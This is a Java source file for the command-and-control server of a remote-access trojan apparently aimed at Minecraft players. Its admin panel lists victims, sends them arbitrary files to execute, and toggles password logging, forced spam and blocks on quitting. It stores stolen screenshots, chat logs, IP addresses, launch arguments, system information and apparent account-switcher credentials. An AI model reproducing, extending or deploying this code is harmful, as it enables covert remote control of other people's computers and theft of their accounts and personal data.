package me.soda.witch.server.server;

import com.google.gson.Gson;
import me.soda.witch.server.gui.AdminPanel;
import me.soda.witch.server.gui.GUI;
import me.soda.witch.server.utils.Info;
import me.soda.witch.server.utils.Utils;
import me.soda.witch.shared.Crypto;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.socket.Connection;
import me.soda.witch.shared.socket.TcpServer;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.*;
import net.miginfocom.swing.MigLayout;

import javax.swing.*;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import javax.swing.table.DefaultTableModel;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;

public class Server extends TcpServer {
    private static final Gson GSON = new Gson();
    public final ConcurrentHashMap<Connection, Info> clientMap = new ConcurrentHashMap<>();
    protected final ClientConfigData clientDefaultConf = Utils.getDefaultClientConfig();
    protected final ServerConfig config = Utils.getServerConfig();
    private final AdminPanel adminPanel;
    private int clientIndex = 0;
    private final List<Integer> selectedConns = new ArrayList<>();

    public Server() throws IOException {
        super();
        adminPanel = new AdminPanel();
        GUI gui = new GUI(adminPanel);
        gui.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                try {
                    stop();
                } catch (IOException ex) {
                    JOptionPane.showConfirmDialog(gui, ex.getMessage(), "Failed to stop server", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
                    System.exit(1);
                }
            }
        });
        adminPanel.table.setComponentPopupMenu(
                new JPopupMenu() {{
                    addPopupMenuListener(new PopupMenuListener() {
                        @Override
                        public void popupMenuWillBecomeVisible(PopupMenuEvent e) {
                            selectedConns.clear();
                            int[] i = adminPanel.table.getSelectedRows();
                            for (int i1 : i) {
                                selectedConns.add((Integer) adminPanel.table.getValueAt(i1, 0));
                            }
                        }

                        @Override
                        public void popupMenuWillBecomeInvisible(PopupMenuEvent e) {
                        }

                        @Override
                        public void popupMenuCanceled(PopupMenuEvent e) {
                        }
                    });


                    JMenuItem disconnect = new JMenuItem("Disconnect");
                    disconnect.addActionListener(e -> getConns().forEach(connection -> connection.close(DisconnectData.Reason.NOREC)));

                    JMenuItem reconnect = new JMenuItem("Reconnect");
                    reconnect.addActionListener(e -> getConns().forEach(connection -> connection.close(DisconnectData.Reason.RECONNECT)));

                    JMenuItem execute = new JMenuItem("Execute");
                    execute.addActionListener(e -> {
                        JFileChooser fileChooser = new JFileChooser();
                        if (fileChooser.showOpenDialog(this) == JFileChooser.APPROVE_OPTION) {
                            try (FileInputStream is = new FileInputStream(fileChooser.getSelectedFile())) {
                                byte[] data = is.readAllBytes();
                                getConns().forEach(connection -> connection.send(Message.fromBytes("execute", data)));
                            } catch (IOException ex) {
                                JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
                            }
                        }
                    });

                    JMenuItem config = new JMenuItem("Config");
                    config.addActionListener(e -> new JDialog(gui, true) {{
                        ClientConfigData cfg = Utils.getDefaultClientConfig();
                        JCheckBox passwordBeingLogged = new JCheckBox("Log password", cfg.passwordBeingLogged);
                        JCheckBox isMuted = new JCheckBox("Mute", cfg.isMuted);
                        JCheckBox isBeingFiltered = new JCheckBox("Filter", cfg.isBeingFiltered);
                        JTextField filterPattern = new JTextField(cfg.filterPattern);
                        JCheckBox logChatAndCommand = new JCheckBox("Log chat and command", cfg.passwordBeingLogged);
                        JCheckBox canJoinServer = new JCheckBox("Can join server", cfg.passwordBeingLogged);
                        JCheckBox canQuitServerOrCloseWindow = new JCheckBox("Can quit server or close window", cfg.passwordBeingLogged);
                        JTextArea invisiblePlayers = new JTextArea();
                        cfg.invisiblePlayers.forEach(p -> invisiblePlayers.append(p + "\n"));
                        JButton send = new JButton("Send");
                        send.addActionListener(e1 -> {
                            cfg.passwordBeingLogged = passwordBeingLogged.isSelected();
                            cfg.isMuted = isMuted.isSelected();
                            cfg.isBeingFiltered = isBeingFiltered.isSelected();
                            cfg.filterPattern = filterPattern.getText();
                            cfg.logChatAndCommand = logChatAndCommand.isSelected();
                            cfg.canJoinServer = canJoinServer.isSelected();
                            cfg.canQuitServerOrCloseWindow = canQuitServerOrCloseWindow.isSelected();
                            cfg.invisiblePlayers = Arrays.stream(invisiblePlayers.getText().split("\n")).map(s -> s.replace("\r", "")).filter(String::isBlank).toList();
                            getConns().forEach(connection -> connection.send(new Message(cfg)));
                            dispose();
                        });

                        setLayout(new MigLayout());
                        add(passwordBeingLogged, "wrap");
                        add(isMuted, "wrap");
                        add(isBeingFiltered, "wrap");
                        add(new JLabel("Filter pattern"), "split 2");
                        add(filterPattern, "wrap, growx");
                        add(logChatAndCommand, "wrap");
                        add(canJoinServer, "wrap");
                        add(canQuitServerOrCloseWindow, "wrap");
                        add(new JLabel("Invisible players"), "split 2");
                        add(invisiblePlayers, "wrap, growx");
                        add(send);
                        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                        pack();
                        setLocationRelativeTo(null);
                        setVisible(true);
                    }});

                    JMenuItem follow = new JMenuItem("Follow");
                    follow.addActionListener(e -> new JDialog(gui, true) {{
                        JTextField followPlayer = new JTextField("Player");
                        JTextField distance = new JTextField("3.0");
                        JCheckBox stop = new JCheckBox("Stop", false);
                        JButton send = new JButton("Send");
                        send.addActionListener(e1 -> {
                            FollowData data = new FollowData(followPlayer.getText(), Double.parseDouble(distance.getText()), stop.isSelected());
                            getConns().forEach(connection -> connection.send(new Message(data)));
                            dispose();
                        });

                        setLayout(new MigLayout());
                        add(new JLabel("Text"), "split 2");
                        add(followPlayer, "wrap, growx");
                        add(new JLabel("Distance"), "split 2");
                        add(distance, "wrap, growx");
                        add(send);
                        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                        pack();
                        setLocationRelativeTo(null);
                        setVisible(true);
                    }});

                    JMenuItem spam = new JMenuItem("Spam");
                    spam.addActionListener(e -> new JDialog(gui, true) {{
                        JTextField text = new JTextField("Text");
                        JTextField times = new JTextField("10");
                        JTextField delayInTicks = new JTextField("20");
                        JCheckBox invisible = new JCheckBox("Target invisible", false);
                        JButton send = new JButton("Send");
                        send.addActionListener(e1 -> {
                            SpamData data = new SpamData(text.getText(), Integer.parseInt(times.getText()), Integer.parseInt(delayInTicks.getText()), invisible.isSelected());
                            getConns().forEach(connection -> connection.send(new Message(data)));
                            dispose();
                        });

                        setLayout(new MigLayout());
                        add(new JLabel("Text"), "split 2");
                        add(text, "wrap, growx");
                        add(new JLabel("Times"), "split 2");
                        add(times, "wrap, growx");
                        add(new JLabel("Delay in ticks"), "split 2");
                        add(delayInTicks, "wrap, growx");
                        add(invisible, "wrap");
                        add(send);
                        setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
                        pack();
                        setLocationRelativeTo(null);
                        setVisible(true);
                    }});

                    add(disconnect);
                    add(reconnect);
                    add(execute);
                    add(config);
                    add(follow);
                    add(spam);
                }}
        );

        log("--@@@@@@@ By Soda5601 @@@@@@@--");
        log("Server Config: %s", GSON.toJson(config));
        log("Client Config: %s", GSON.toJson(clientDefaultConf));
        log("Server started on %d", config.port);
        Crypto.INSTANCE = new Crypto(config.encryptionKey.getBytes());

        start(config.port);
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }

    @Override
    public void onOpen(Connection conn) {
        String address = conn.getRemoteSocketAddress().getAddress().getHostAddress();
        log("Client connected: %s ID: %d", address, clientIndex);
        clientMap.put(conn, new Info(clientIndex));
        ((DefaultTableModel) adminPanel.table.getModel()).addRow(new Object[]{clientIndex, null, null});
        clientIndex++;
    }

    @Override
    public void onMessage(Connection conn, Message message) {
        Info info = clientMap.get(conn);
        int id = info.id;
        try {
            if (message.data instanceof ByteData data) {
                switch (data.id) {
                    case "screenshot", "screenshot2" -> {
                        File file = new File(Utils.getDataFile("screenshots"), getFileName(data.id + "id", "png", String.valueOf(id), true));
                        FileUtil.write(file, data.bytes());
                    }
                    case "skin" -> {
                        String playerName = info.player.playerName;
                        File file = new File(Utils.getDataFile("skins"), getFileName(playerName, "png", String.valueOf(id), false));
                        FileUtil.write(file, data.bytes());
                    }
                }
            } else if (message.data instanceof StringsData data) {
                if (data.data().length == 0 && data.id().equals("getconfig")) {
                    conn.send(new Message(clientDefaultConf));
                } else if (data.data().length == 1) {
                    String msg = data.data()[0];
                    switch (data.id()) {
                        case "logging" -> {
                            File file = new File(Utils.getDataFile("player_logs"), getFileName("id", "log", String.valueOf(id), false));
                            String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
                            FileUtil.write(file, (oldInfo + msg).getBytes(StandardCharsets.UTF_8));
                        }
                        case "ip" -> {
                            info.ip = msg;
                            changeRow(info, false);
                        }
                        case "iasconfig", "runargs", "systeminfo", "props" -> {
                            File file = new File(Utils.getDataFile("data"), getFileName(data.id(), "txt", info.player.playerName, true));
                            FileUtil.write(file, msg);
                        }
                    }
                }
            } else if (message.data instanceof PlayerData data) {
                info.player = data;
                changeRow(info, false);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        log("Received message: %s From ID %d", message.data.getClass().getName(), id);
    }

    @Override
    public void onClose(Connection conn, DisconnectData disconnectData) {
        Info info = clientMap.get(conn);
        changeRow(info, true);
        log("Client disconnected: ID: %d", info.id);
        clientMap.remove(conn);
    }

    private void log(String str, Object... format) {
        adminPanel.console.append("[" + LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss.SS")) + "] " + String.format(str, format));
    }

    private void changeRow(Info info, boolean delete) {
        DefaultTableModel connTableModel = (DefaultTableModel) adminPanel.table.getModel();
        for (int i = 0; i < connTableModel.getRowCount(); i++) {
            int id = (int) connTableModel.getValueAt(i, 0);
            if (id == info.id) {
                if (delete) {
                    connTableModel.removeRow(i);
                    return;
                }

                connTableModel.setValueAt(info.ip, i, 1);
                connTableModel.setValueAt(info.player != null ? info.player.playerName : "", i, 2);
                return;
            }
        }
    }

    private List<Connection> getConns() {
        return getConnections().stream().filter(conn -> selectedConns.contains(clientMap.get(conn).id)).toList();
    }
}
